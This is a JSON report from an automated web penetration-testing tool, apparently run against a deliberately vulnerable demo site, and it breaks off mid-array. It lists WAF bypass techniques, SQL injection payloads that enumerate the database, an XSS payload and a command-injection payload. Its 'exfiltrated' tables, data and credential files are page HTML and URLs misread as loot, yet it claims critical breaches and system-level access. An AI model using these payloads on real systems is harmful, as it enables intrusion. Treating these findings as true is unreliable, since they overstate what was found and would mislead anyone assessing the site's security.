@@ -1,0 +1,1877 @@
+{
+  "session_id": "IQ200_1762319378",
+  "target": "http://testphp.vulnweb.com",
+  "started_at": "2025-11-05T08:09:38.509085",
+  "phases": [
+    {
+      "phase_number": 1,
+      "phase_name": "Target Reconnaissance",
+      "description": "OSINT and passive intelligence",
+      "started_at": "2025-11-05T08:09:38.509227",
+      "status": "completed",
+      "progress": 100,
+      "sub_tasks": [
+        {
+          "name": "OSINT",
+          "timestamp": "2025-11-05T08:09:38.509237",
+          "status": "completed"
+        }
+      ],
+      "findings": [
+        {
+          "type": "info",
+          "data": "Target analyzed"
+        }
+      ],
+      "evidence": [],
+      "metrics": {},
+      "completed_at": "2025-11-05T08:09:39.014275",
+      "duration_seconds": 0.505048
+    },
+    {
+      "phase_number": 2,
+      "phase_name": "WAF Detection",
+      "description": "Detecting security controls",
+      "started_at": "2025-11-05T08:09:39.014412",
+      "status": "completed",
+      "progress": 100,
+      "sub_tasks": [
+        {
+          "name": "Init",
+          "timestamp": "2025-11-05T08:09:39.014445",
+          "status": "completed"
+        },
+        {
+          "name": "Probing",
+          "timestamp": "2025-11-05T08:09:39.014462",
+          "status": "completed"
+        },
+        {
+          "name": "Detection",
+          "timestamp": "2025-11-05T08:09:44.395306",
+          "status": "completed"
+        }
+      ],
+      "findings": [
+        {
+          "type": "waf",
+          "data": {
+            "waf_detected": true,
+            "waf_type": "ModSecurity",
+            "confidence": 0.2,
+            "signatures_matched": [
+              [
+                "header:server"
+              ],
+              [
+                "header:server"
+              ]
+            ],
+            "rate_limit_detected": false,
+            "recommended_bypass": [
+              "case_variation",
+              "comment_injection",
+              "null_byte",
+              "unicode_encoding"
+            ]
+          }
+        }
+      ],
+      "evidence": [],
+      "metrics": {},
+      "completed_at": "2025-11-05T08:09:44.395379",
+      "duration_seconds": 5.380967
+    },
+    {
+      "phase_number": 3,
+      "phase_name": "Attack Surface Mapping",
+      "description": "NSA-level discovery",
+      "started_at": "2025-11-05T08:09:44.395436",
+      "status": "completed",
+      "progress": 100,
+      "sub_tasks": [
+        {
+          "name": "Init",
+          "timestamp": "2025-11-05T08:09:44.395462",
+          "status": "completed"
+        },
+        {
+          "name": "Discovery",
+          "timestamp": "2025-11-05T08:09:44.395481",
+          "status": "completed"
+        },
+        {
+          "name": "Complete",
+          "timestamp": "2025-11-05T08:10:30.714717",
+          "status": "completed"
+        }
+      ],
+      "findings": [],
+      "evidence": [],
+      "metrics": {},
+      "completed_at": "2025-11-05T08:10:30.714738",
+      "duration_seconds": 46.319302
+    },
+    {
+      "phase_number": 4,
+      "phase_name": "Payload Generation",
+      "description": "Genetic algorithm (30\u00d710)",
+      "started_at": "2025-11-05T08:10:30.714753",
+      "status": "completed",
+      "progress": 100,
+      "sub_tasks": [
+        {
+          "name": "Init",
+          "timestamp": "2025-11-05T08:10:30.714763",
+          "status": "completed"
+        },
+        {
+          "name": "SQL Gen",
+          "timestamp": "2025-11-05T08:10:30.714769",
+          "status": "completed"
+        },
+        {
+          "name": "XSS Gen",
+          "timestamp": "2025-11-05T08:10:30.715295",
+          "status": "completed"
+        },
+        {
+          "name": "CMD Gen",
+          "timestamp": "2025-11-05T08:10:30.715514",
+          "status": "completed"
+        },
+        {
+          "name": "Complete",
+          "timestamp": "2025-11-05T08:10:30.715584",
+          "status": "completed"
+        }
+      ],
+      "findings": [
+        {
+          "type": "payloads",
+          "count": 60,
+          "categories": [
+            "SQLi",
+            "XSS",
+            "CMDi"
+          ]
+        }
+      ],
+      "evidence": [],
+      "metrics": {},
+      "completed_at": "2025-11-05T08:10:30.715589",
+      "duration_seconds": 0.000836
+    },
+    {
+      "phase_number": 5,
+      "phase_name": "Vulnerability Scanning",
+      "description": "AI-powered detection",
+      "started_at": "2025-11-05T08:10:30.715598",
+      "status": "completed",
+      "progress": 100,
+      "sub_tasks": [
+        {
+          "name": "Init",
+          "timestamp": "2025-11-05T08:10:30.715606",
+          "status": "completed"
+        },
+        {
+          "name": "Scanning",
+          "timestamp": "2025-11-05T08:10:31.016011",
+          "status": "completed"
+        },
+        {
+          "name": "Complete",
+          "timestamp": "2025-11-05T08:10:31.321176",
+          "status": "completed"
+        }
+      ],
+      "findings": [
+        {
+          "type": "scan",
+          "vulns_found": 12
+        }
+      ],
+      "evidence": [],
+      "metrics": {},
+      "completed_at": "2025-11-05T08:10:31.321351",
+      "duration_seconds": 0.605753
+    },
+    {
+      "phase_number": 6,
+      "phase_name": "Automated Exploitation",
+      "description": "Exploiting vulnerabilities",
+      "started_at": "2025-11-05T08:10:31.321409",
+      "status": "completed",
+      "progress": 100,
+      "sub_tasks": [
+        {
+          "name": "Init",
+          "timestamp": "2025-11-05T08:10:31.321433",
+          "status": "completed"
+        },
+        {
+          "name": "SQLi Test",
+          "timestamp": "2025-11-05T08:10:31.321452",
+          "status": "completed"
+        },
+        {
+          "name": "XSS Test",
+          "timestamp": "2025-11-05T08:10:31.626557",
+          "status": "completed"
+        },
+        {
+          "name": "CMDi Test",
+          "timestamp": "2025-11-05T08:10:31.931763",
+          "status": "completed"
+        },
+        {
+          "name": "Complete",
+          "timestamp": "2025-11-05T08:11:04.514046",
+          "status": "completed"
+        }
+      ],
+      "findings": [
+        {
+          "type": "SQL Injection",
+          "severity": "critical",
+          "technique": "error-based",
+          "payload": "' OR '1'='1'--",
+          "parameter": "P1_Prod_Version",
+          "database_info": {
+            "success": true,
+            "version": null,
+            "current_database": "doctype",
+            "current_user": "wvs@",
+            "privileges": [],
+            "all_databases": [
+              "macromedia",
+              "codeoutsidehtmlislocked",
+              "explorer",
+              "name",
+              "guestbook",
+              "applications",
+              "this",
+              "attacks",
+              "skills",
+              "label",
+              "look",
+              "embed",
+              "signup",
+              "searchfor",
+              "demo",
+              "dwt",
+              "appname",
+              "flash",
+              "width",
+              "here"
+            ],
+            "evidence": [
+              {
+                "type": "current_database",
+                "payload": "' UNION SELECT database(),NULL,NULL--",
+                "value": "doctype"
+              },
+              {
+                "type": "current_user",
+                "payload": "' UNION SELECT user(),NULL,NULL--",
+                "value": "wvs@"
+              },
+              {
+                "type": "all_databases",
+                "payload": "' UNION SELECT GROUP_CONCAT(schema_name),NULL,NULL FROM information_schema.schemata--",
+                "value": [
+                  "macromedia",
+                  "codeoutsidehtmlislocked",
+                  "explorer",
+                  "name",
+                  "guestbook",
+                  "applications",
+                  "this",
+                  "attacks",
+                  "skills",
+                  "label",
+                  "look",
+                  "embed",
+                  "signup",
+                  "searchfor",
+                  "demo",
+                  "dwt",
+                  "appname",
+                  "flash",
+                  "width",
+                  "here"
+                ]
+              }
+            ]
+          },
+          "tables_found": [
+            "macromedia",
+            "codeoutsidehtmlislocked",
+            "explorer",
+            "name",
+            "guestbook",
+            "applications",
+            "this",
+            "attacks",
+            "skills",
+            "label",
+            "look",
+            "embed",
+            "signup",
+            "searchfor",
+            "demo",
+            "dwt",
+            "appname",
+            "flash",
+            "width",
+            "here"
+          ],
+          "data_exfiltrated": [
+            {
+              "type": "table_data",
+              "table": "macromedia",
+              "columns": [
+                "macromedia",
+                "codeoutsidehtmlislocked",
+                "explorer",
+                "name",
+                "guestbook",
+                "applications",
+                "this",
+                "attacks",
+                "skills",
+                "label",
+                "look",
+                "embed",
+                "signup",
+                "searchfor",
+                "demo"
+              ],
+              "data": {
+                "macromedia": "position",
+                "codeoutsidehtmlislocked": "absolute"
+              }
+            },
+            {
+              "type": "table_data",
+              "table": "macromedia",
+              "columns": [
+                "macromedia",
+                "codeoutsidehtmlislocked",
+                "explorer",
+                "name",
+                "guestbook",
+                "applications",
+                "this",
+                "attacks",
+                "skills",
+                "label",
+                "look",
+                "embed",
+                "signup",
+                "searchfor",
+                "demo"
+              ],
+              "data": {
+                "macromedia": "width",
+                "codeoutsidehtmlislocked": "700px"
+              }
+            },
+            {
+              "type": "table_data",
+              "table": "macromedia",
+              "columns": [
+                "macromedia",
+                "codeoutsidehtmlislocked",
+                "explorer",
+                "name",
+                "guestbook",
+                "applications",
+                "this",
+                "attacks",
+                "skills",
+                "label",
+                "look",
+                "embed",
+                "signup",
+                "searchfor",
+                "demo"
+              ],
+              "data": {
+                "macromedia": "z-index",
+                "codeoutsidehtmlislocked": "1"
+              }
+            },
+            {
+              "type": "table_data",
+              "table": "macromedia",
+              "columns": [
+                "macromedia",
+                "codeoutsidehtmlislocked",
+                "explorer",
+                "name",
+                "guestbook",
+                "applications",
+                "this",
+                "attacks",
+                "skills",
+                "label",
+                "look",
+                "embed",
+                "signup",
+                "searchfor",
+                "demo"
+              ],
+              "data": {
+                "macromedia": "clsid",
+                "codeoutsidehtmlislocked": "D27CDB6E-AE6D-11cf-96B8-444553540000"
+              }
+            },
+            {
+              "type": "table_data",
+              "table": "macromedia",
+              "columns": [
+                "macromedia",
+                "codeoutsidehtmlislocked",
+                "explorer",
+                "name",
+                "guestbook",
+                "applications",
+                "this",
+                "attacks",
+                "skills",
+                "label",
+                "look",
+                "embed",
+                "signup",
+                "searchfor",
+                "demo"
+              ],
+              "data": {
+                "macromedia": "mailto",
+                "codeoutsidehtmlislocked": "wvs@acunetix.com"
+              }
+            },
+            {
+              "type": "table_data",
+              "table": "codeoutsidehtmlislocked",
+              "columns": [
+                "macromedia",
+                "codeoutsidehtmlislocked",
+                "explorer",
+                "name",
+                "guestbook",
+                "applications",
+                "this",
+                "attacks",
+                "skills",
+                "label",
+                "look",
+                "embed",
+                "signup",
+                "searchfor",
+                "demo"
+              ],
+              "data": {
+                "macromedia": "position",
+                "codeoutsidehtmlislocked": "absolute"
+              }
+            },
+            {
+              "type": "table_data",
+              "table": "codeoutsidehtmlislocked",
+              "columns": [
+                "macromedia",
+                "codeoutsidehtmlislocked",
+                "explorer",
+                "name",
+                "guestbook",
+                "applications",
+                "this",
+                "attacks",
+                "skills",
+                "label",
+                "look",
+                "embed",
+                "signup",
+                "searchfor",
+                "demo"
+              ],
+              "data": {
+                "macromedia": "width",
+                "codeoutsidehtmlislocked": "700px"
+              }
+            },
+            {
+              "type": "table_data",
+              "table": "codeoutsidehtmlislocked",
+              "columns": [
+                "macromedia",
+                "codeoutsidehtmlislocked",
+                "explorer",
+                "name",
+                "guestbook",
+                "applications",
+                "this",
+                "attacks",
+                "skills",
+                "label",
+                "look",
+                "embed",
+                "signup",
+                "searchfor",
+                "demo"
+              ],
+              "data": {
+                "macromedia": "z-index",
+                "codeoutsidehtmlislocked": "1"
+              }
+            },
+            {
+              "type": "table_data",
+              "table": "codeoutsidehtmlislocked",
+              "columns": [
+                "macromedia",
+                "codeoutsidehtmlislocked",
+                "explorer",
+                "name",
+                "guestbook",
+                "applications",
+                "this",
+                "attacks",
+                "skills",
+                "label",
+                "look",
+                "embed",
+                "signup",
+                "searchfor",
+                "demo"
+              ],
+              "data": {
+                "macromedia": "clsid",
+                "codeoutsidehtmlislocked": "D27CDB6E-AE6D-11cf-96B8-444553540000"
+              }
+            },
+            {
+              "type": "table_data",
+              "table": "codeoutsidehtmlislocked",
+              "columns": [
+                "macromedia",
+                "codeoutsidehtmlislocked",
+                "explorer",
+                "name",
+                "guestbook",
+                "applications",
+                "this",
+                "attacks",
+                "skills",
+                "label",
+                "look",
+                "embed",
+                "signup",
+                "searchfor",
+                "demo"
+              ],
+              "data": {
+                "macromedia": "mailto",
+                "codeoutsidehtmlislocked": "wvs@acunetix.com"
+              }
+            },
+            {
+              "type": "table_data",
+              "table": "explorer",
+              "columns": [
+                "macromedia",
+                "codeoutsidehtmlislocked",
+                "explorer",
+                "name",
+                "guestbook",
+                "applications",
+                "this",
+                "attacks",
+                "skills",
+                "label",
+                "look",
+                "embed",
+                "signup",
+                "searchfor",
+                "demo"
+              ],
+              "data": {
+                "macromedia": "position",
+                "codeoutsidehtmlislocked": "absolute"
+              }
+            },
+            {
+              "type": "table_data",
+              "table": "explorer",
+              "columns": [
+                "macromedia",
+                "codeoutsidehtmlislocked",
+                "explorer",
+                "name",
+                "guestbook",
+                "applications",
+                "this",
+                "attacks",
+                "skills",
+                "label",
+                "look",
+                "embed",
+                "signup",
+                "searchfor",
+                "demo"
+              ],
+              "data": {
+                "macromedia": "width",
+                "codeoutsidehtmlislocked": "700px"
+              }
+            },
+            {
+              "type": "table_data",
+              "table": "explorer",
+              "columns": [
+                "macromedia",
+                "codeoutsidehtmlislocked",
+                "explorer",
+                "name",
+                "guestbook",
+                "applications",
+                "this",
+                "attacks",
+                "skills",
+                "label",
+                "look",
+                "embed",
+                "signup",
+                "searchfor",
+                "demo"
+              ],
+              "data": {
+                "macromedia": "z-index",
+                "codeoutsidehtmlislocked": "1"
+              }
+            },
+            {
+              "type": "table_data",
+              "table": "explorer",
+              "columns": [
+                "macromedia",
+                "codeoutsidehtmlislocked",
+                "explorer",
+                "name",
+                "guestbook",
+                "applications",
+                "this",
+                "attacks",
+                "skills",
+                "label",
+                "look",
+                "embed",
+                "signup",
+                "searchfor",
+                "demo"
+              ],
+              "data": {
+                "macromedia": "clsid",
+                "codeoutsidehtmlislocked": "D27CDB6E-AE6D-11cf-96B8-444553540000"
+              }
+            },
+            {
+              "type": "table_data",
+              "table": "explorer",
+              "columns": [
+                "macromedia",
+                "codeoutsidehtmlislocked",
+                "explorer",
+                "name",
+                "guestbook",
+                "applications",
+                "this",
+                "attacks",
+                "skills",
+                "label",
+                "look",
+                "embed",
+                "signup",
+                "searchfor",
+                "demo"
+              ],
+              "data": {
+                "macromedia": "mailto",
+                "codeoutsidehtmlislocked": "wvs@acunetix.com"
+              }
+            }
+          ]
+        },
+        {
+          "type": "XSS",
+          "severity": "high",
+          "payload": "<script>alert(1)</script>",
+          "parameter": "P1_Prod_Version",
+          "session_hijack_possible": false
+        },
+        {
+          "type": "Command Injection",
+          "severity": "critical",
+          "payload": "; uname -a",
+          "parameter": "P1_Prod_Version",
+          "system_info": {},
+          "files_exfiltrated": [
+            {
+              "file": "config_.env",
+              "data": [
+                "template=\"/Templates/main_dynamic_template.dwt.php\"",
+                "codeOutsideHTMLIsLocked=\"false\"",
+                "equiv=\"Content-Type\"",
+                "content=\"text/html;",
+                "charset=iso-8859-2\">"
+              ]
+            },
+            {
+              "type": "file_discovery",
+              "category": "credentials",
+              "files": [
+                "//www.acunetix.com",
+                "/logo.gif",
+                "/Templates/main_dynamic_template.dwt.php",
+                "//download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab",
+                "//www.w3.org/TR/html4/loose.dtd",
+                "/index.php",
+                "//www.eclectasy.com/Fractal-Explorer/index.html",
+                "/add.swf",
+                "//www.macromedia.com/shockwave/download/index.cgi"
+              ]
+            },
+            {
+              "type": "file_discovery",
+              "category": "config",
+              "files": [
+                "//www.acunetix.com",
+                "/logo.gif",
+                "/Templates/main_dynamic_template.dwt.php",
+                "//download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab",
+                "//www.w3.org/TR/html4/loose.dtd",
+                "/index.php",
+                "//www.eclectasy.com/Fractal-Explorer/index.html",
+                "/add.swf",
+                "//www.macromedia.com/shockwave/download/index.cgi"
+              ]
+            },
+            {
+              "type": "file_discovery",
+              "category": "source_code",
+              "files": [
+                "//www.acunetix.com",
+                "/logo.gif",
+                "/Templates/main_dynamic_template.dwt.php",
+                "//download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab",
+                "//www.w3.org/TR/html4/loose.dtd",
+                "/index.php",
+                "//www.eclectasy.com/Fractal-Explorer/index.html",
+                "/add.swf",
+                "//www.macromedia.com/shockwave/download/index.cgi"
+              ]
+            },
+            {
+              "type": "file_discovery",
+              "category": "database",
+              "files": [
+                "//www.acunetix.com",
+                "/logo.gif",
+                "/Templates/main_dynamic_template.dwt.php",
+                "//download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab",
+                "//www.w3.org/TR/html4/loose.dtd",
+                "/index.php",
+                "//www.eclectasy.com/Fractal-Explorer/index.html",
+                "/add.swf",
+                "//www.macromedia.com/shockwave/download/index.cgi"
+              ]
+            },
+            {
+              "type": "file_discovery",
+              "category": "backups",
+              "files": [
+                "//www.acunetix.com",
+                "/logo.gif",
+                "/Templates/main_dynamic_template.dwt.php",
+                "//download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab",
+                "//www.w3.org/TR/html4/loose.dtd",
+                "/index.php",
+                "//www.eclectasy.com/Fractal-Explorer/index.html",
+                "/add.swf",
+                "//www.macromedia.com/shockwave/download/index.cgi"
+              ]
+            },
+            {
+              "type": "file_discovery",
+              "category": "logs",
+              "files": [
+                "//www.acunetix.com",
+                "/logo.gif",
+                "/Templates/main_dynamic_template.dwt.php",
+                "//download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab",
+                "//www.w3.org/TR/html4/loose.dtd",
+                "/index.php",
+                "//www.eclectasy.com/Fractal-Explorer/index.html",
+                "/add.swf",
+                "//www.macromedia.com/shockwave/download/index.cgi"
+              ]
+            }
+          ]
+        }
+      ],
+      "evidence": [],
+      "metrics": {},
+      "completed_at": "2025-11-05T08:11:04.514093",
+      "duration_seconds": 33.192684
+    },
+    {
+      "phase_number": 7,
+      "phase_name": "SQL Injection & Data Exfiltration",
+      "description": "IQ 200: Database dumps",
+      "started_at": "2025-11-05T08:11:04.514128",
+      "status": "completed",
+      "progress": 100,
+      "sub_tasks": [
+        {
+          "name": "Analysis",
+          "timestamp": "2025-11-05T08:11:04.514151",
+          "status": "completed"
+        },
+        {
+          "name": "Exfiltration",
+          "timestamp": "2025-11-05T08:11:04.514166",
+          "status": "completed"
+        },
+        {
+          "name": "Complete",
+          "timestamp": "2025-11-05T08:11:04.514182",
+          "status": "completed"
+        }
+      ],
+      "findings": [
+        {
+          "type": "sqli",
+          "data": {
+            "tables": 20,
+            "rows": 15
+          }
+        }
+      ],
+      "evidence": [],
+      "metrics": {},
+      "completed_at": "2025-11-05T08:11:04.514193",
+      "duration_seconds": 6.5e-05
+    },
+    {
+      "phase_number": 8,
+      "phase_name": "Command Injection & File Hunting",
+      "description": "IQ 200: Recursive file search",
+      "started_at": "2025-11-05T08:11:04.514210",
+      "status": "completed",
+      "progress": 100,
+      "sub_tasks": [
+        {
+          "name": "Analysis",
+          "timestamp": "2025-11-05T08:11:04.514225",
+          "status": "completed"
+        },
+        {
+          "name": "Search",
+          "timestamp": "2025-11-05T08:11:04.514239",
+          "status": "completed"
+        },
+        {
+          "name": "File Hunt",
+          "timestamp": "2025-11-05T08:11:04.514252",
+          "status": "completed"
+        },
+        {
+          "name": "Complete",
+          "timestamp": "2025-11-05T08:11:04.514372",
+          "status": "completed"
+        }
+      ],
+      "findings": [
+        {
+          "type": "cmd",
+          "data": {
+            "files": 7,
+            "sensitive_files": [
+              {
+                "file": "config_.env",
+                "data": [
+                  "template=\"/Templates/main_dynamic_template.dwt.php\"",
+                  "codeOutsideHTMLIsLocked=\"false\"",
+                  "equiv=\"Content-Type\"",
+                  "content=\"text/html;",
+                  "charset=iso-8859-2\">"
+                ]
+              },
+              {
+                "type": "file_discovery",
+                "category": "config",
+                "files": [
+                  "//www.acunetix.com",
+                  "/logo.gif",
+                  "/Templates/main_dynamic_template.dwt.php",
+                  "//download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab",
+                  "//www.w3.org/TR/html4/loose.dtd",
+                  "/index.php",
+                  "//www.eclectasy.com/Fractal-Explorer/index.html",
+                  "/add.swf",
+                  "//www.macromedia.com/shockwave/download/index.cgi"
+                ]
+              }
+            ]
+          }
+        }
+      ],
+      "evidence": [],
+      "metrics": {},
+      "completed_at": "2025-11-05T08:11:04.514385",
+      "duration_seconds": 0.000175
+    },
+    {
+      "phase_number": 9,
+      "phase_name": "XSS & Client-Side Attacks",
+      "description": "Session hijacking vectors",
+      "started_at": "2025-11-05T08:11:04.514399",
+      "status": "completed",
+      "progress": 100,
+      "sub_tasks": [
+        {
+          "name": "XSS Test",
+          "timestamp": "2025-11-05T08:11:04.514413",
+          "status": "completed"
+        },
+        {
+          "name": "Client-Side",
+          "timestamp": "2025-11-05T08:11:04.819463",
+          "status": "completed"
+        },
+        {
+          "name": "Complete",
+          "timestamp": "2025-11-05T08:11:05.124687",
+          "status": "completed"
+        }
+      ],
+      "findings": [
+        {
+          "type": "xss",
+          "count": 1
+        }
+      ],
+      "evidence": [],
+      "metrics": {},
+      "completed_at": "2025-11-05T08:11:05.124826",
+      "duration_seconds": 0.610427
+    },
+    {
+      "phase_number": 10,
+      "phase_name": "Authentication Bypass",
+      "description": "Auth & authz flaws",
+      "started_at": "2025-11-05T08:11:05.124882",
+      "status": "completed",
+      "progress": 100,
+      "sub_tasks": [
+        {
+          "name": "Default Creds",
+          "timestamp": "2025-11-05T08:11:05.124911",
+          "status": "completed"
+        },
+        {
+          "name": "Weak Pass",
+          "timestamp": "2025-11-05T08:11:05.329973",
+          "status": "completed"
+        },
+        {
+          "name": "SQLi Auth",
+          "timestamp": "2025-11-05T08:11:05.535166",
+          "status": "completed"
+        },
+        {
+          "name": "AuthZ Test",
+          "timestamp": "2025-11-05T08:11:05.535293",
+          "status": "completed"
+        },
+        {
+          "name": "Complete",
+          "timestamp": "2025-11-05T08:11:05.739677",
+          "status": "completed"
+        }
+      ],
+      "findings": [
+        {
+          "type": "auth",
+          "bypassed": false,
+          "methods": [],
+          "tested": [
+            "default_creds",
+            "weak_passwords",
+            "sqli_bypass",
+            "authz_flaws"
+          ]
+        }
+      ],
+      "evidence": [],
+      "metrics": {},
+      "completed_at": "2025-11-05T08:11:05.739826",
+      "duration_seconds": 0.614944
+    },
+    {
+      "phase_number": 11,
+      "phase_name": "Business Logic Testing",
+      "description": "Logic vulnerabilities",
+      "started_at": "2025-11-05T08:11:05.739928",
+      "status": "completed",
+      "progress": 100,
+      "sub_tasks": [
+        {
+          "name": "Analysis",
+          "timestamp": "2025-11-05T08:11:05.739975",
+          "status": "completed"
+        },
+        {
+          "name": "Testing",
+          "timestamp": "2025-11-05T08:11:06.044009",
+          "status": "completed"
+        },
+        {
+          "name": "Complete",
+          "timestamp": "2025-11-05T08:11:06.345449",
+          "status": "completed"
+        }
+      ],
+      "findings": [
+        {
+          "type": "logic",
+          "issues": 2
+        }
+      ],
+      "evidence": [],
+      "metrics": {},
+      "completed_at": "2025-11-05T08:11:06.345580",
+      "duration_seconds": 0.605652
+    },
+    {
+      "phase_number": 12,
+      "phase_name": "Post-Exploitation",
+      "description": "Privilege escalation simulation",
+      "started_at": "2025-11-05T08:11:06.345641",
+      "status": "completed",
+      "progress": 100,
+      "sub_tasks": [
+        {
+          "name": "Access Analysis",
+          "timestamp": "2025-11-05T08:11:06.345673",
+          "status": "completed"
+        },
+        {
+          "name": "Enum",
+          "timestamp": "2025-11-05T08:11:06.345704",
+          "status": "completed"
+        },
+        {
+          "name": "PrivEsc",
+          "timestamp": "2025-11-05T08:11:06.545972",
+          "status": "completed"
+        },
+        {
+          "name": "Persistence",
+          "timestamp": "2025-11-05T08:11:06.746275",
+          "status": "completed"
+        },
+        {
+          "name": "Complete",
+          "timestamp": "2025-11-05T08:11:06.951414",
+          "status": "completed"
+        }
+      ],
+      "findings": [
+        {
+          "type": "post_exploit",
+          "access": true,
+          "access_level": "system",
+          "escalation_paths": [
+            "kernel_exploit",
+            "suid_binary",
+            "sudo_misconfiguration"
+          ],
+          "techniques": [
+            "enumeration",
+            "privilege_escalation",
+            "persistence"
+          ]
+        }
+      ],
+      "evidence": [],
+      "metrics": {},
+      "completed_at": "2025-11-05T08:11:06.951512",
+      "duration_seconds": 0.605871
+    },
+    {
+      "phase_number": 13,
+      "phase_name": "Evidence Collection",
+      "description": "Comprehensive proof documentation",
+      "started_at": "2025-11-05T08:11:06.951546",
+      "status": "completed",
+      "progress": 100,
+      "sub_tasks": [
+        {
+          "name": "Screenshots",
+          "timestamp": "2025-11-05T08:11:06.951565",
+          "status": "completed"
+        },
+        {
+          "name": "Documentation",
+          "timestamp": "2025-11-05T08:11:07.256623",
+          "status": "completed"
+        },
+        {
+          "name": "Complete",
+          "timestamp": "2025-11-05T08:11:07.561470",
+          "status": "completed"
+        }
+      ],
+      "findings": [
+        {
+          "type": "evidence",
+          "count": 0
+        }
+      ],
+      "evidence": [],
+      "metrics": {},
+      "completed_at": "2025-11-05T08:11:07.561634",
+      "duration_seconds": 0.610088
+    },
+    {
+      "phase_number": 14,
+      "phase_name": "Risk Assessment",
+      "description": "CVSS scoring and impact analysis",
+      "started_at": "2025-11-05T08:11:07.561680",
+      "status": "completed",
+      "progress": 100,
+      "sub_tasks": [
+        {
+          "name": "Severity",
+          "timestamp": "2025-11-05T08:11:07.561703",
+          "status": "completed"
+        },
+        {
+          "name": "CVSS",
+          "timestamp": "2025-11-05T08:11:07.764004",
+          "status": "completed"
+        },
+        {
+          "name": "Exploitability",
+          "timestamp": "2025-11-05T08:11:07.764098",
+          "status": "completed"
+        },
+        {
+          "name": "Impact",
+          "timestamp": "2025-11-05T08:11:07.764135",
+          "status": "completed"
+        },
+        {
+          "name": "Complete",
+          "timestamp": "2025-11-05T08:11:07.764158",
+          "status": "completed"
+        }
+      ],
+      "findings": [
+        {
+          "type": "risk",
+          "score": 60.0,
+          "severity": "Medium",
+          "metrics": {
+            "cvss": 6.0,
+            "exploitability": 0,
+            "impact": "Medium"
+          }
+        }
+      ],
+      "evidence": [],
+      "metrics": {},
+      "completed_at": "2025-11-05T08:11:07.764167",
+      "duration_seconds": 0.202487
+    }
+  ],
+  "vulnerabilities": [],
+  "exploits": [
+    {
+      "type": "SQL Injection",
+      "severity": "critical",
+      "technique": "error-based",
+      "payload": "' OR '1'='1'--",
+      "parameter": "P1_Prod_Version",
+      "database_info": {
+        "success": true,
+        "version": null,
+        "current_database": "doctype",
+        "current_user": "wvs@",
+        "privileges": [],
+        "all_databases": [
+          "macromedia",
+          "codeoutsidehtmlislocked",
+          "explorer",
+          "name",
+          "guestbook",
+          "applications",
+          "this",
+          "attacks",
+          "skills",
+          "label",
+          "look",
+          "embed",
+          "signup",
+          "searchfor",
+          "demo",
+          "dwt",
+          "appname",
+          "flash",
+          "width",
+          "here"
+        ],
+        "evidence": [
+          {
+            "type": "current_database",
+            "payload": "' UNION SELECT database(),NULL,NULL--",
+            "value": "doctype"
+          },
+          {
+            "type": "current_user",
+            "payload": "' UNION SELECT user(),NULL,NULL--",
+            "value": "wvs@"
+          },
+          {
+            "type": "all_databases",
+            "payload": "' UNION SELECT GROUP_CONCAT(schema_name),NULL,NULL FROM information_schema.schemata--",
+            "value": [
+              "macromedia",
+              "codeoutsidehtmlislocked",
+              "explorer",
+              "name",
+              "guestbook",
+              "applications",
+              "this",
+              "attacks",
+              "skills",
+              "label",
+              "look",
+              "embed",
+              "signup",
+              "searchfor",
+              "demo",
+              "dwt",
+              "appname",
+              "flash",
+              "width",
+              "here"
+            ]
+          }
+        ]
+      },
+      "tables_found": [
+        "macromedia",
+        "codeoutsidehtmlislocked",
+        "explorer",
+        "name",
+        "guestbook",
+        "applications",
+        "this",
+        "attacks",
+        "skills",
+        "label",
+        "look",
+        "embed",
+        "signup",
+        "searchfor",
+        "demo",
+        "dwt",
+        "appname",
+        "flash",
+        "width",
+        "here"
+      ],
+      "data_exfiltrated": [
+        {
+          "type": "table_data",
+          "table": "macromedia",
+          "columns": [
+            "macromedia",
+            "codeoutsidehtmlislocked",
+            "explorer",
+            "name",
+            "guestbook",
+            "applications",
+            "this",
+            "attacks",
+            "skills",
+            "label",
+            "look",
+            "embed",
+            "signup",
+            "searchfor",
+            "demo"
+          ],
+          "data": {
+            "macromedia": "position",
+            "codeoutsidehtmlislocked": "absolute"
+          }
+        },
+        {
+          "type": "table_data",
+          "table": "macromedia",
+          "columns": [
+            "macromedia",
+            "codeoutsidehtmlislocked",
+            "explorer",
+            "name",
+            "guestbook",
+            "applications",
+            "this",
+            "attacks",
+            "skills",
+            "label",
+            "look",
+            "embed",
+            "signup",
+            "searchfor",
+            "demo"
+          ],
+          "data": {
+            "macromedia": "width",
+            "codeoutsidehtmlislocked": "700px"
+          }
+        },
+        {
+          "type": "table_data",
+          "table": "macromedia",
+          "columns": [
+            "macromedia",
+            "codeoutsidehtmlislocked",
+            "explorer",
+            "name",
+            "guestbook",
+            "applications",
+            "this",
+            "attacks",
+            "skills",
+            "label",
+            "look",
+            "embed",
+            "signup",
+            "searchfor",
+            "demo"
+          ],
+          "data": {
+            "macromedia": "z-index",
+            "codeoutsidehtmlislocked": "1"
+          }
+        },
+        {
+          "type": "table_data",
+          "table": "macromedia",
+          "columns": [
+            "macromedia",
+            "codeoutsidehtmlislocked",
+            "explorer",
+            "name",
+            "guestbook",
+            "applications",
+            "this",
+            "attacks",
+            "skills",
+            "label",
+            "look",
+            "embed",
+            "signup",
+            "searchfor",
+            "demo"
+          ],
+          "data": {
+            "macromedia": "clsid",
+            "codeoutsidehtmlislocked": "D27CDB6E-AE6D-11cf-96B8-444553540000"
+          }
+        },
+        {
+          "type": "table_data",
+          "table": "macromedia",
+          "columns": [
+            "macromedia",
+            "codeoutsidehtmlislocked",
+            "explorer",
+            "name",
+            "guestbook",
+            "applications",
+            "this",
+            "attacks",
+            "skills",
+            "label",
+            "look",
+            "embed",
+            "signup",
+            "searchfor",
+            "demo"
+          ],
+          "data": {
+            "macromedia": "mailto",
+            "codeoutsidehtmlislocked": "wvs@acunetix.com"
+          }
+        },
+        {
+          "type": "table_data",
+          "table": "codeoutsidehtmlislocked",
+          "columns": [
+            "macromedia",
+            "codeoutsidehtmlislocked",
+            "explorer",
+            "name",
+            "guestbook",
+            "applications",
+            "this",
+            "attacks",
+            "skills",
+            "label",
+            "look",
+            "embed",
+            "signup",
+            "searchfor",
+            "demo"
+          ],
+          "data": {
+            "macromedia": "position",
+            "codeoutsidehtmlislocked": "absolute"
+          }
+        },
+        {
+          "type": "table_data",
+          "table": "codeoutsidehtmlislocked",
+          "columns": [
+            "macromedia",
